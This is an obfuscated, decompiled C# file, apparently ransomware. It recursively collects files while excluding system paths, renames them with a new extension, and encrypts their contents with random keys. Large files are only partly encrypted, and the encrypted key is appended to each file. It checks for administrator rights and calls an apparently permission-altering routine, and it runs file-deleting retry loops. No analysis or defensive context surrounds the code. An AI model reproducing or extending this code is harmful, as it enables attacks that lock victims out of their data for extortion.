using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using RsIcyUzdWFKY;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace zvenNXaGjQywAfJS;

internal sealed class AFNAiOPxfKG
{
	public sealed class hBZmhuRtAPH
	{
		private static StringCollection EELzjYfNeeUc;

		private static List<string> SKozKobdxFhbXxD;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107409733));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107409728)) && !text.ToLower().Contains(getString_0(107409707)) && !text.ToLower().Contains(getString_0(107394304)) && !text.ToLower().Contains(getString_0(107394259)) && !text.ToLower().Contains(getString_0(107409662)) && !text.ToLower().Contains(getString_0(107394619)) && !text.ToLower().Contains(getString_0(107394592)) && !text.ToLower().Contains(getString_0(107394543)) && !text.ToLower().Contains(getString_0(107394526)) && !text.ToLower().Contains(getString_0(107394541)) && !text.ToLower().Contains(getString_0(107394507)) && !text.ToLower().Contains(getString_0(107394458)) && !text.ToLower().Contains(getString_0(107394473)) && !text.ToLower().Contains(getString_0(107394428)) && !text.ToLower().Contains(getString_0(107394439)) && !text.ToLower().Contains(getString_0(107393882)) && !text.ToLower().Contains(getString_0(107393901)) && !text.ToLower().Contains(getString_0(107393852)) && !text.ToLower().Contains(getString_0(107393867)) && !text.Contains(KfBmpaPpRy(getString_0(107393818))) && !text.Contains(getString_0(107393825)) && !text.Contains(getString_0(107393795)) && !text.EndsWith(getString_0(107395310)) && !text.EndsWith(getString_0(107393770)) && !text.EndsWith(getString_0(107393765)) && !text.EndsWith(getString_0(107393760)) && !text.EndsWith(getString_0(107393723)) && !text.ToLower().Contains(getString_0(107393718)) && !text.ToLower().Contains(IYcsuWjlOhpGqM))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(MOZyLSAyVmBVtUMu) * 1024.0 * 1024.0 && mHhRadxeyhbcW == getString_0(107396768))
							{
								SKozKobdxFhbXxD.Add(text);
							}
							else if (File.Exists(text) && mHhRadxeyhbcW == getString_0(107396773))
							{
								SKozKobdxFhbXxD.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return SKozKobdxFhbXxD;
		}

		static hBZmhuRtAPH()
		{
			Strings.CreateGetStringDelegate(typeof(hBZmhuRtAPH));
			EELzjYfNeeUc = new StringCollection();
			SKozKobdxFhbXxD = new List<string>();
		}
	}

	private sealed class VRCyEzeZUIYroKza
	{
		public string IIQbRrCarJJrxLIc;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == IIQbRrCarJJrxLIc;
		}
	}

	private sealed class UfneJPKmcXGsZ
	{
		private sealed class wXiAedkquQTqJ
		{
			public UfneJPKmcXGsZ SFiNojbEAyy;

			public string ZsGFAKiUGeqZ;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					PfklXCmYiYi(WindowsIdentity.GetCurrent().Name, ZsGFAKiUGeqZ);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				noFLAUmckMbzvzH(ZsGFAKiUGeqZ, SFiNojbEAyy.wrxrDZCpVpM, SFiNojbEAyy.yCiuSQiAWEU, SFiNojbEAyy.jSPQJJgGeg, SFiNojbEAyy.pmOSsYEwCjh);
			}
		}

		public string[] wrxrDZCpVpM;

		public string[] jSPQJJgGeg;

		public string pmOSsYEwCjh;

		public string yCiuSQiAWEU;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			wXiAedkquQTqJ CS_0024_003C_003E8__locals0 = new wXiAedkquQTqJ();
			CS_0024_003C_003E8__locals0.SFiNojbEAyy = this;
			CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ = string_0;
			if (ZqCAqHfWvbFF && !KqilAqOxbJnylCSb().Contains(getString_0(107392372)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						PfklXCmYiYi(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (vRguZFjQqPE == getString_0(107396774))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					noFLAUmckMbzvzH(CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ, CS_0024_003C_003E8__locals0.SFiNojbEAyy.wrxrDZCpVpM, CS_0024_003C_003E8__locals0.SFiNojbEAyy.yCiuSQiAWEU, CS_0024_003C_003E8__locals0.SFiNojbEAyy.jSPQJJgGeg, CS_0024_003C_003E8__locals0.SFiNojbEAyy.pmOSsYEwCjh);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				noFLAUmckMbzvzH(CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ, wrxrDZCpVpM, yCiuSQiAWEU, jSPQJJgGeg, pmOSsYEwCjh);
			}
		}

		static UfneJPKmcXGsZ()
		{
			Strings.CreateGetStringDelegate(typeof(UfneJPKmcXGsZ));
		}
	}

	private sealed class QJcgVBxUsCEC
	{
		private sealed class zSfJzmFrTZL
		{
			public QJcgVBxUsCEC TvmAypQFomSId;

			public string BIihmeVwFtm;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in hVXoeTbUUaWy)
				{
					if (BIihmeVwFtm.ToLower().EndsWith(item + TvmAypQFomSId.FYzxAexoqJ) && nPOfuoWjdBEJXWdYO == getString_0(107396785))
					{
						if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > new FileInfo(BIihmeVwFtm).Length)
						{
							try
							{
								OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394713), getString_0(107394708), getString_0(107395175), BIihmeVwFtm);
							}
							catch
							{
							}
						}
					}
					else if (BIihmeVwFtm.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396790))
					{
						try
						{
							OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394713), getString_0(107394708), getString_0(107395175), BIihmeVwFtm);
						}
						catch
						{
						}
					}
				}
			}

			static zSfJzmFrTZL()
			{
				Strings.CreateGetStringDelegate(typeof(zSfJzmFrTZL));
			}
		}

		private sealed class BHXZMKqkMA
		{
			public QJcgVBxUsCEC TvmAypQFomSId;

			public string oDbjaiuffOt;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in hVXoeTbUUaWy)
				{
					if (oDbjaiuffOt.ToLower().EndsWith(item + TvmAypQFomSId.FYzxAexoqJ) && nPOfuoWjdBEJXWdYO == getString_0(107396788))
					{
						if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > new FileInfo(oDbjaiuffOt).Length)
						{
							try
							{
								OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394716), getString_0(107394711), getString_0(107395178), oDbjaiuffOt);
							}
							catch
							{
							}
						}
					}
					else if (oDbjaiuffOt.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396793))
					{
						try
						{
							OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394716), getString_0(107394711), getString_0(107395178), oDbjaiuffOt);
						}
						catch
						{
						}
					}
				}
			}

			static BHXZMKqkMA()
			{
				Strings.CreateGetStringDelegate(typeof(BHXZMKqkMA));
			}
		}

		public List<string> NKWSHTwvInRp;

		public List<string> jeTEtaMYQQ;

		public string FYzxAexoqJ;

		public string[] BdIZrOwRALjd;

		public string cCZPkZyYefOPII;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			zSfJzmFrTZL CS_0024_003C_003E8__locals0;
			foreach (string item in jeTEtaMYQQ)
			{
				if (BdIZrOwRALjd.Length != 0)
				{
					string[] bdIZrOwRALjd = BdIZrOwRALjd;
					int num = 0;
					while (num < bdIZrOwRALjd.Length)
					{
						string value = bdIZrOwRALjd[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(FYzxAexoqJ))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || WBtfQTDigGvEr.Contains(item))
				{
					continue;
				}
				if (HgiayPeKZIFbQY == getString_0(107396782))
				{
					try
					{
						if (EmnCHwZWHQrr.XSYtYWGRMmEpa(item))
						{
							EmnCHwZWHQrr.FOCwwURjqSYijRv(item);
						}
					}
					catch
					{
					}
				}
				WBtfQTDigGvEr.Add(item);
				if (!CarZQGMNGUm.Contains(Path.GetDirectoryName(item)))
				{
					CarZQGMNGUm.Add(Path.GetDirectoryName(item));
				}
				nnDUfvPemlz(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (zObGGMIceXoVAZ)
						{
							try
							{
								File.AppendAllText(nzrzeINFdi, getString_0(107392994) + item + getString_0(107409691) + ex2.Message + getString_0(107396608));
							}
							catch (Exception)
							{
							}
						}
						ZKtLKJvwOV++;
						goto end_IL_00ee;
					}
					if (JXFCxCiyhWYLpp == getString_0(107396782) && new FileInfo(item).Length > Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024 && !NKWSHTwvInRp.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new zSfJzmFrTZL();
						CS_0024_003C_003E8__locals0.TvmAypQFomSId = this;
						try
						{
							if (FYzxAexoqJ != getString_0(107392230))
							{
								if (xPtaINcBZjHD)
								{
									FYzxAexoqJ = tvMzMsATBRq + FYzxAexoqJ;
								}
								File.Move(item, item + FYzxAexoqJ);
							}
						}
						catch (Exception ex4)
						{
							if (zObGGMIceXoVAZ)
							{
								try
								{
									File.AppendAllText(nzrzeINFdi, getString_0(107392994) + item + getString_0(107409598) + ex4.Message + getString_0(107396608));
								}
								catch (Exception)
								{
								}
							}
							ZKtLKJvwOV++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.BIihmeVwFtm = getString_0(107395109);
						if (FYzxAexoqJ != getString_0(107392230))
						{
							CS_0024_003C_003E8__locals0.BIihmeVwFtm = item + FYzxAexoqJ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BIihmeVwFtm = item;
						}
						if (rfxQznDDZcfw == getString_0(107396782))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in hVXoeTbUUaWy)
								{
									if (CS_0024_003C_003E8__locals0.BIihmeVwFtm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.TvmAypQFomSId.FYzxAexoqJ) && nPOfuoWjdBEJXWdYO == zSfJzmFrTZL.getString_0(107396785))
									{
										if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BIihmeVwFtm).Length)
										{
											try
											{
												OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(zSfJzmFrTZL.getString_0(107394713), zSfJzmFrTZL.getString_0(107394708), zSfJzmFrTZL.getString_0(107395175), CS_0024_003C_003E8__locals0.BIihmeVwFtm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BIihmeVwFtm.ToLower().EndsWith(item2) && nPOfuoWjdBEJXWdYO == zSfJzmFrTZL.getString_0(107396790))
									{
										try
										{
											OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(zSfJzmFrTZL.getString_0(107394713), zSfJzmFrTZL.getString_0(107394708), zSfJzmFrTZL.getString_0(107395175), CS_0024_003C_003E8__locals0.BIihmeVwFtm);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
						string s = FSXOXhUgBZ.xjZeAJzrGxgor(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = pztwxceNvBEECh.gvGKdDcaUqNYg(CS_0024_003C_003E8__locals0.BIihmeVwFtm, Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024);
						pztwxceNvBEECh.LtuLFdTpnGb(qOqKYvDIyDIVu: (!eccKoyYfSl) ? (RoDeoCKBnUdhS ? pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (RoDeoCKBnUdhS ? nzCLlPCHXLqP.HSujbXnDcqZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nzCLlPCHXLqP.HSujbXnDcqZ(byte_, Encoding.ASCII.GetBytes(cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NuxIUSruribeoZ: CS_0024_003C_003E8__locals0.BIihmeVwFtm, zmckcQUytJzy: bytes);
					}
					else
					{
						if (xPtaINcBZjHD)
						{
							FYzxAexoqJ = tvMzMsATBRq + FYzxAexoqJ;
						}
						string text2 = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
						string s2 = FSXOXhUgBZ.xjZeAJzrGxgor(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (FYzxAexoqJ != getString_0(107392230))
						{
							if (!TOGjrVUqPLyQO)
							{
								if (!RoDeoCKBnUdhS)
								{
									NUBwAswciLFT(item, item + FYzxAexoqJ, PbrXnMMGEpFUDsS);
								}
								else
								{
									NUBwAswciLFT(item, item + FYzxAexoqJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!RoDeoCKBnUdhS)
									{
										VMoTmzztMnQLt(item, item + FYzxAexoqJ, PbrXnMMGEpFUDsS);
									}
									else
									{
										VMoTmzztMnQLt(item, item + FYzxAexoqJ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zObGGMIceXoVAZ)
									{
										try
										{
											File.AppendAllText(nzrzeINFdi, getString_0(107392994) + item + getString_0(107392248) + ex6.Message + getString_0(107396608));
										}
										catch (Exception)
										{
										}
									}
									ZKtLKJvwOV++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!TOGjrVUqPLyQO)
						{
							if (!RoDeoCKBnUdhS)
							{
								NUBwAswciLFT(item, item + getString_0(107392225), PbrXnMMGEpFUDsS);
							}
							else
							{
								NUBwAswciLFT(item, item + getString_0(107392225), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!RoDeoCKBnUdhS)
								{
									VMoTmzztMnQLt(item, item, PbrXnMMGEpFUDsS);
								}
								else
								{
									VMoTmzztMnQLt(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zObGGMIceXoVAZ)
								{
									try
									{
										File.AppendAllText(nzrzeINFdi, getString_0(107392994) + item + getString_0(107392248) + ex8.Message + getString_0(107396608));
									}
									catch (Exception)
									{
									}
								}
								ZKtLKJvwOV++;
								goto end_IL_00ee;
							}
						}
						if (RoDeoCKBnUdhS)
						{
							if (FYzxAexoqJ != getString_0(107392230))
							{
								NebQHReckdpj(item + FYzxAexoqJ, bytes2);
							}
							else
							{
								NebQHReckdpj(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				jeTEtaMYQQ.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			BHXZMKqkMA CS_0024_003C_003E8__locals0 = new BHXZMKqkMA();
			CS_0024_003C_003E8__locals0.TvmAypQFomSId = this;
			CS_0024_003C_003E8__locals0.oDbjaiuffOt = string_0;
			if (BdIZrOwRALjd.Length != 0)
			{
				string[] bdIZrOwRALjd = BdIZrOwRALjd;
				int num = 0;
				while (num < bdIZrOwRALjd.Length)
				{
					string value = bdIZrOwRALjd[num];
					if (!CS_0024_003C_003E8__locals0.oDbjaiuffOt.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.oDbjaiuffOt.EndsWith(FYzxAexoqJ))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!WBtfQTDigGvEr.Contains(CS_0024_003C_003E8__locals0.oDbjaiuffOt))
			{
				if (HgiayPeKZIFbQY == getString_0(107396782))
				{
					try
					{
						if (EmnCHwZWHQrr.XSYtYWGRMmEpa(CS_0024_003C_003E8__locals0.oDbjaiuffOt))
						{
							EmnCHwZWHQrr.FOCwwURjqSYijRv(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
						}
					}
					catch
					{
					}
				}
				WBtfQTDigGvEr.Add(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
				if (!CarZQGMNGUm.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oDbjaiuffOt)))
				{
					CarZQGMNGUm.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oDbjaiuffOt));
				}
				nnDUfvPemlz(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.oDbjaiuffOt).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (zObGGMIceXoVAZ)
						{
							try
							{
								File.AppendAllText(nzrzeINFdi, getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + getString_0(107409691) + ex2.Message + getString_0(107396608));
							}
							catch (Exception)
							{
							}
						}
						ZKtLKJvwOV++;
						goto end_IL_0117_2;
					}
					if (JXFCxCiyhWYLpp == getString_0(107396782) && new FileInfo(CS_0024_003C_003E8__locals0.oDbjaiuffOt).Length > Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024)
					{
						try
						{
							if (FYzxAexoqJ != getString_0(107392230))
							{
								if (xPtaINcBZjHD)
								{
									FYzxAexoqJ = tvMzMsATBRq + FYzxAexoqJ;
								}
								File.Move(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + FYzxAexoqJ);
							}
						}
						catch (Exception ex4)
						{
							if (zObGGMIceXoVAZ)
							{
								try
								{
									File.AppendAllText(nzrzeINFdi, getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + getString_0(107409598) + ex4.Message + getString_0(107396608));
								}
								catch (Exception)
								{
								}
							}
							ZKtLKJvwOV++;
							return;
						}
						if (FYzxAexoqJ != getString_0(107392230))
						{
							CS_0024_003C_003E8__locals0.oDbjaiuffOt += FYzxAexoqJ;
						}
						if (rfxQznDDZcfw == getString_0(107396782))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in hVXoeTbUUaWy)
								{
									if (CS_0024_003C_003E8__locals0.oDbjaiuffOt.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.TvmAypQFomSId.FYzxAexoqJ) && nPOfuoWjdBEJXWdYO == BHXZMKqkMA.getString_0(107396788))
									{
										if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.oDbjaiuffOt).Length)
										{
											try
											{
												OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(BHXZMKqkMA.getString_0(107394716), BHXZMKqkMA.getString_0(107394711), BHXZMKqkMA.getString_0(107395178), CS_0024_003C_003E8__locals0.oDbjaiuffOt);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.oDbjaiuffOt.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == BHXZMKqkMA.getString_0(107396793))
									{
										try
										{
											OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(BHXZMKqkMA.getString_0(107394716), BHXZMKqkMA.getString_0(107394711), BHXZMKqkMA.getString_0(107395178), CS_0024_003C_003E8__locals0.oDbjaiuffOt);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
						string s = FSXOXhUgBZ.xjZeAJzrGxgor(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = pztwxceNvBEECh.gvGKdDcaUqNYg(CS_0024_003C_003E8__locals0.oDbjaiuffOt, Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024);
						pztwxceNvBEECh.LtuLFdTpnGb(qOqKYvDIyDIVu: (!eccKoyYfSl) ? (RoDeoCKBnUdhS ? pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (RoDeoCKBnUdhS ? nzCLlPCHXLqP.HSujbXnDcqZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nzCLlPCHXLqP.HSujbXnDcqZ(byte_, Encoding.ASCII.GetBytes(cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NuxIUSruribeoZ: CS_0024_003C_003E8__locals0.oDbjaiuffOt, zmckcQUytJzy: bytes);
					}
					else
					{
						if (xPtaINcBZjHD)
						{
							FYzxAexoqJ = tvMzMsATBRq + FYzxAexoqJ;
						}
						string text2 = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
						string s2 = FSXOXhUgBZ.xjZeAJzrGxgor(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (FYzxAexoqJ != getString_0(107392230))
						{
							if (!TOGjrVUqPLyQO)
							{
								if (!RoDeoCKBnUdhS)
								{
									NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + FYzxAexoqJ, PbrXnMMGEpFUDsS);
								}
								else
								{
									NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + FYzxAexoqJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!RoDeoCKBnUdhS)
									{
										VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + FYzxAexoqJ, PbrXnMMGEpFUDsS);
									}
									else
									{
										VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + FYzxAexoqJ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zObGGMIceXoVAZ)
									{
										try
										{
											File.AppendAllText(nzrzeINFdi, getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + getString_0(107392248) + ex6.Message + getString_0(107396608));
										}
										catch (Exception)
										{
										}
									}
									ZKtLKJvwOV++;
									return;
								}
							}
						}
						else if (!TOGjrVUqPLyQO)
						{
							if (!RoDeoCKBnUdhS)
							{
								NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + getString_0(107392225), PbrXnMMGEpFUDsS);
							}
							else
							{
								NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + getString_0(107392225), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!RoDeoCKBnUdhS)
								{
									VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt, PbrXnMMGEpFUDsS);
								}
								else
								{
									VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zObGGMIceXoVAZ)
								{
									try
									{
										File.AppendAllText(nzrzeINFdi, getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + getString_0(107392248) + ex8.Message + getString_0(107396608));
									}
									catch (Exception)
									{
									}
								}
								ZKtLKJvwOV++;
								return;
							}
						}
						if (RoDeoCKBnUdhS)
						{
							if (FYzxAexoqJ != getString_0(107392230))
							{
								NebQHReckdpj(CS_0024_003C_003E8__locals0.oDbjaiuffOt + FYzxAexoqJ, bytes2);
							}
							else
							{
								NebQHReckdpj(CS_0024_003C_003E8__locals0.oDbjaiuffOt, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			jeTEtaMYQQ.Remove(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
		}

		static QJcgVBxUsCEC()
		{
			Strings.CreateGetStringDelegate(typeof(QJcgVBxUsCEC));
		}
	}

	private sealed class ubLNeoZDotnmG
	{
		public string RPXomsJlLYxsvlMK;

		public string OjDIrXMUzyfG;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(RPXomsJlLYxsvlMK);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(OjDIrXMUzyfG))
					{
						File.Delete(OjDIrXMUzyfG);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string uWFvpRMRVQI;

	public static byte[] PbrXnMMGEpFUDsS;

	public static string mHhRadxeyhbcW;

	public static string MOZyLSAyVmBVtUMu;

	public static List<string> AVtexYHLTL;

	public static List<string> DwCgnVKtlvbbh;

	public static string GcgKdRtBNfYo;

	public static string cCZPkZyYefOPII;

	public static string lhmVFsEfZqBVvrv;

	public static string ehmLJtnXYxYzJ;

	public static int FHnNdGQfMfZLQ;

	public static string HgiayPeKZIFbQY;

	public static string OnbGhlCpdM;

	public static string NZwBvHLOph;

	public static string RhKffUzShDrwT;

	public static string QrPovEgHgdDTosS;

	public static string MvNSnhedoPzREp;

	public static string FPJcVMshPit;

	public static string ezaaqHOMpUba;

	public static List<string> gZeepLCxldrKjy;

	public static List<string> CarZQGMNGUm;

	public static string NQSIcXgsfxwP;

	public static string LEnjOQhiZianv;

	public static string yPwnUxlbvglN;

	public static List<string> WBtfQTDigGvEr;

	public static string olfcnDyKkIf;

	private static string taIcriAzbBhMzV;

	public static string vRguZFjQqPE;

	public static string hKDgHkPtCfE;

	public static List<string> MnlfjMRAEDLqxPS;

	public static List<string> JKOJEVchMLNdwO;

	public static List<string> HEYpTuOcBu;

	public static List<string> PLOLJYWeMWGpM;

	public static string JrEMVbiIdsnWGMh;

	public static List<string> TvdQhUAZHUpp;

	public static List<string> jQsJEYgqnYfva;

	public static string OBiTPypEPPSaLg;

	public static string IFKuwcmSLwPIPe;

	internal static DateTime NqbcwORJHgk;

	internal static DateTime fHNlylXjhwtg;

	public static string JXFCxCiyhWYLpp;

	public static string raHMniyIxZuJCC;

	public static string xRGLBhsaFcrKl;

	public static string rGsrRKpAHJNl;

	public static string mkVfwfeWFJpck;

	public static string EjtjxbjTqgmD;

	public static string WHGgQTjRlvqky;

	public static string rfxQznDDZcfw;

	public static List<string> hVXoeTbUUaWy;

	public static string nPOfuoWjdBEJXWdYO;

	public static string YPZutdATMurXqcQ;

	public static string XrJhJtkEBjIoJZ;

	public static string VJtZoDtDriMd;

	public static string AeXPwayjsZCdzeV;

	public static string NDMXRGcShGOYi;

	public static string loMcYZKWQQXGC;

	public static string JedayuyjYQv;

	public static string tUDzwIURvHClJE;

	public static string xLWNYJMVcE;

	public static string rIobnorOVTwoPh;

	public static string cqEXBgzhEbOYvf;

	public static string ezghwjRSrPj;

	public static string LhfSrEuWtmc;

	public static string tXlRkfKutDq;

	public static string TWTJTObvOmNzyB;

	public static string PmxsRzjJGPB;

	public static string QuwbVcHirWQ;

	public static string ORjgfofRMlyF;

	public static string IYcsuWjlOhpGqM;

	public static string TvQOhOYJDM;

	public static string vnKLbNPAXvMkPFb;

